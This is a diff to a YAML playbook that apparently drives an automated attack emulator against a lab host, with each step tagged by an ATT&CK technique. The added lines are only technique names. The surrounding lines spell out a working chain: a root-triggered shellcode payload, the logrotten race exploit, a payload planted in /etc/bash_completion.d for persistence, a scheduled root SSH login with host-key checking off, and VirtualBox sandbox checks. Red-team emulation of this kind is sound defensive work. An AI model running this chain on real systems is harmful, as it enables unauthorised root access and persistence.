@@ -158,6 +158,7 @@ commands:
     metadata:
       techniques: "T1546"
       tactics: " Privilege Escalation,Persistence"
+      technique_name: "Event Triggered Execution"
 
   - type: msf-session
     cmd: echo "if [ \`id -u\` -eq 0 ]; then \$( {{shellcode3333.stdout}} | sh ); fi" > payload
@@ -165,6 +166,7 @@ commands:
     metadata:
       techniques: "T1546"
       tactics: " Privilege Escalation,Persistence"
+      technique_name: "Event Triggered Execution"
 
   - type: msf-session
     cmd: "rm -rf log"
@@ -172,6 +174,7 @@ commands:
     metadata:
       techniques: "T1546"
       tactics: " Privilege Escalation,Persistence"
+      technique_name: "Event Triggered Execution"
 
   - type: msf-session
     cmd: "mkdir log"
@@ -179,6 +182,7 @@ commands:
     metadata:
       techniques: "T1546"
       tactics: " Privilege Escalation,Persistence"
+      technique_name: "Event Triggered Execution"
 
   - type: msf-session
     cmd: "echo empty > log/accesss.log"
@@ -186,6 +190,7 @@ commands:
     metadata:
       techniques: "T1546"
       tactics: " Privilege Escalation,Persistence"
+      technique_name: "Event Triggered Execution"
 
   - type: msf-session
     cmd: "./logrotten -p /var/www/default/payload /var/www/default/log/accesss.log"
@@ -193,12 +198,14 @@ commands:
     metadata:
       techniques: "T1546"
       tactics: " Privilege Escalation,Persistence"
+      technique_name: "Event Triggered Execution"
 
   - type: sleep
     seconds: 960
     metadata:
       techniques: "T1546"
       tactics: " Privilege Escalation,Persistence"
+      technique_name: "Event Triggered Execution"
 
   - type: msf-session
     cmd: "id"
@@ -208,7 +215,6 @@ commands:
   - type: msf-session
     cmd: "cat /var/www/default/payload > /etc/bash_completion.d/accesss.log"
     session: "foothold"
-
 
   - type: ssh
     cmd: echo "ssh -i .ssh/rootkey -o StrictHostKeyChecking=no root@172.17.100.121 '. /etc/bash_completion'" | at now + 10 minute
@@ -280,7 +286,7 @@ commands:
     metadata:
       techniques: "T1120"
       tactics: "Discovery"
-
+      technique_name: "Peripheral Device Discovery"
 
   - type: msf-session
     cmd: command -v lsusb
@@ -288,6 +294,7 @@ commands:
     metadata:
       techniques: "T1120"
       tactics: "Discovery"
+      technique_name: "Peripheral Device Discovery"
 
   - type: msf-session
     cmd: date
@@ -295,6 +302,7 @@ commands:
     metadata:
       techniques: "T1124"
       tactics: "Discovery"
+      technique_name: "System Time Discovery"
 
   - type: msf-session
     cmd: find /usr -name \*virtualbox\*
@@ -302,3 +310,5 @@ commands:
     metadata:
       techniques: "T1497.001"
       tactics: "Defense Evasion, Discovery"
+      technique_name: "Virtualization/Sandbox Evasion: System Checks"
+
